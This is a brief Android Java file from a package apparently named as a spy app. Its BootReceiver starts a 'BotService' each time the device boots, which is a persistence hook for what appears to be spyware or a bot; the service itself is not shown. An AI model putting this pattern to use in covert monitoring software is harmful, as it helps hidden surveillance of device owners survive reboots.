package com.mycompany.myspyapp;

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {
            Intent serviceIntent = new Intent(c, BotService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                c.startForegroundService(serviceIntent);
            } else {
                c.startService(serviceIntent);
            }
        }
    }
}
